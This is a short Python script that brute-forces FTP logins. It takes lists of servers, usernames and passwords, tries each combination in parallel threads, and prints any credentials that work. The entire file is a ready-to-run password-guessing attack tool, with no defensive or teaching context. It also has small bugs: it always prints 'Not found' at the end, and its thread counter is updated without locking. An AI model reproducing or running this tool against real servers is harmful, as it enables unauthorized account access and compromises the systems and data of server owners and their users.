#! /usr/bin/python3.6

from ftplib import FTP, error_perm
from _thread import start_new_thread
import time
from os import system, get_terminal_size
import platform

print('\033[1;31;40m')
if platform.system() == 'Windows':
    system('cls')
elif platform.system() == 'Linux':
    system('clear')

server_list = input('Server: ')  # To read from the file: file <server_lis.txt>
if server_list[0:5] == 'file ':
    server_list = open(server_list[5:], 'r').read().splitlines()
else:
    server_list = server_list.split(' ')

user_list = input('Username: ')  # To read from the file: file <user_list.txt>
if user_list[0:5] == 'file ':
    user_list = open(user_list[5:], 'r').read().splitlines()
else:
    user_list = user_list.split(' ')

pass_list = input('Password: ')  # To read from the file: file <passlist.txt>
if pass_list[0:5] == 'file ':
    pass_list = open(pass_list[5:], 'r').read().splitlines()
else:
    pass_list = pass_list.split(' ')

max_thread = input('Thread[10]: ')
if max_thread == '':
    max_thread = 10
else:
    max_thread = int(max_thread)

if platform.system() == 'Windows':
    system('cls')
elif platform.system() == 'Linux':
    system('clear')

thread_number = 0
found = []


def test(server, user):
    global thread_number
    thread_number = thread_number + 1
    for password in pass_list:
        print(server + ' : ' + user + ' : ' + password)
        try:
            ftp = FTP(server)
            ftp.login(user, password)
            found.append('Found   ' + server + ' : ' + user + ' : ' + password)
            thread_number = thread_number - 1
            exit()
        except error_perm:
            continue
        except ConnectionRefusedError:
            thread_number = thread_number - 1
            exit()
        except:
            thread_number = thread_number - 1
            exit()
    thread_number = thread_number - 1
    exit()


try:
    for _server in server_list:
        for _user in user_list:
            while True:
                if thread_number <= max_thread:
                    start_new_thread(test, (_server, _user))
                    time.sleep(0.4)
                    break
                else:
                    time.sleep(0.2)
                    continue
    while True:
        if thread_number == 0:
            break
        else:
            time.sleep(0.4)
except KeyboardInterrupt:
    pass

if platform.system() == 'Windows':
    system('cls')
elif platform.system() == 'Linux':
    system('clear')
print('-' * int(get_terminal_size().columns))
for item in found:
    print(item)
else:
    print('Not found')
print('End')
exit()
